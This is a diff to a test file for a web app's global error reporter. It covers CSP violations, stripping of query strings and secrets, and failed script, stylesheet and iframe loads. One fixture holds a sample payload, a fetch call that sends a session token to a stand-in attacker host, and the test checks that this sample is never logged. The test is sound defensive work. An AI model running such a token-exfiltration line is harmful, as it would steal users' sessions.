@@ -45,7 +45,7 @@ describe("installGlobalErrorReporting", () => {
     expect(reportClientError).toHaveBeenCalledWith(reason, { source: "unhandled-rejection" });
   });
 
-  it("reports CSP violations with directive/source/line/sample detail, stripping the source URL's query string", () => {
+  it("reports CSP violations with directive/source/line detail, stripping the source URL's query string", () => {
     const event = new Event("securitypolicyviolation");
     Object.defineProperty(event, "violatedDirective", { value: "script-src-elem" });
     Object.defineProperty(event, "blockedURI", { value: "inline" });
@@ -53,20 +53,31 @@ describe("installGlobalErrorReporting", () => {
       value: "https://admitto.example.com/admin/events/x/settings?tab=mail&token=secret123",
     });
     Object.defineProperty(event, "lineNumber", { value: 25 });
-    Object.defineProperty(event, "sample", { value: "some blocked inline code" });
     document.dispatchEvent(event);
 
     expect(reportClientError).toHaveBeenCalledTimes(1);
     const [err, ctx] = reportClientError.mock.calls[0];
     expect(ctx).toEqual({ source: "csp-violation" });
-    expect(err.message).toContain("script-src-elem");
-    expect(err.message).toContain("https://admitto.example.com/admin/events/x/settings:25");
+    expect(err.message).toBe("script-src-elem blocked inline at https://admitto.example.com/admin/events/x/settings:25");
     expect(err.message).not.toContain("tab=mail");
     expect(err.message).not.toContain("token=secret123");
-    // The sample is the blocked script/style's own (third-party) content, not first-party
-    // user data - kept, truncated, since it's the one field that actually identifies the
-    // culprit; see PR #1053 review discussion.
-    expect(err.message).toContain("some blocked inline code");
+  });
+
+  it("never includes the violation's sample text, even a sensitive one", () => {
+    const event = new Event("securitypolicyviolation");
+    Object.defineProperty(event, "violatedDirective", { value: "script-src-elem" });
+    Object.defineProperty(event, "blockedURI", { value: "inline" });
+    Object.defineProperty(event, "sourceFile", { value: "https://admitto.example.com/admin/events/x/settings" });
+    Object.defineProperty(event, "lineNumber", { value: 25 });
+    Object.defineProperty(event, "sample", {
+      value: "fetch('https://evil.example/steal?token=user-secret-session-abc123')",
+    });
+    document.dispatchEvent(event);
+
+    const [err] = reportClientError.mock.calls[0];
+    expect(err.message).not.toContain("evil.example");
+    expect(err.message).not.toContain("user-secret-session-abc123");
+    expect(err.message).not.toContain("fetch(");
   });
 
   it("strips a query string from a blocked external resource URL too", () => {
@@ -80,12 +91,62 @@ describe("installGlobalErrorReporting", () => {
     expect(err.message).not.toContain("uid=abc123");
   });
 
-  it("falls back to placeholders when the violation event has no blockedURI/sourceFile/lineNumber", () => {
+  it("falls back to placeholders when the violation event has no blockedURI/sourceFile", () => {
     const event = new Event("securitypolicyviolation");
     Object.defineProperty(event, "violatedDirective", { value: "style-src" });
+    Object.defineProperty(event, "lineNumber", { value: 0 });
     document.dispatchEvent(event);
 
     const [err] = reportClientError.mock.calls[0];
-    expect(err.message).toBe('style-src blocked (inline) at ?:? sample=""');
+    expect(err.message).toBe("style-src blocked (inline) at ?:0");
+  });
+
+  it("reports a failed resource load (e.g. an injected <script src> that 404s) that a CSP violation wouldn't cover", () => {
+    const script = document.createElement("script");
+    script.src = "https://cdn.example.com/injected.js?v=abc123";
+    document.body.appendChild(script);
+
+    script.dispatchEvent(new Event("error"));
+
+    expect(reportClientError).toHaveBeenCalledTimes(1);
+    const [err, ctx] = reportClientError.mock.calls[0];
+    expect(ctx).toEqual({ source: "resource-error" });
+    expect(err.message).toBe("Failed to load script https://cdn.example.com/injected.js");
+
+    document.body.removeChild(script);
+  });
+
+  it("reports a failed stylesheet load by its href", () => {
+    const link = document.createElement("link");
+    link.rel = "stylesheet";
+    link.href = "https://cdn.example.com/theme.css?v=abc123";
+    document.body.appendChild(link);
+
+    link.dispatchEvent(new Event("error"));
+
+    const [err] = reportClientError.mock.calls[0];
+    expect(err.message).toBe("Failed to load link https://cdn.example.com/theme.css");
+
+    document.body.removeChild(link);
+  });
+
+  it("reports a resource-error event whose target isn't an Element at all", () => {
+    window.dispatchEvent(new Event("error"));
+
+    const [err, ctx] = reportClientError.mock.calls[0];
+    expect(ctx).toEqual({ source: "resource-error" });
+    expect(err.message).toBe("Failed to load resource");
+  });
+
+  it("reports a failed load for an element type with no src/href to point at", () => {
+    const iframe = document.createElement("iframe");
+    document.body.appendChild(iframe);
+
+    iframe.dispatchEvent(new Event("error"));
+
+    const [err] = reportClientError.mock.calls[0];
+    expect(err.message).toBe("Failed to load iframe");
+
+    document.body.removeChild(iframe);
   });
 });
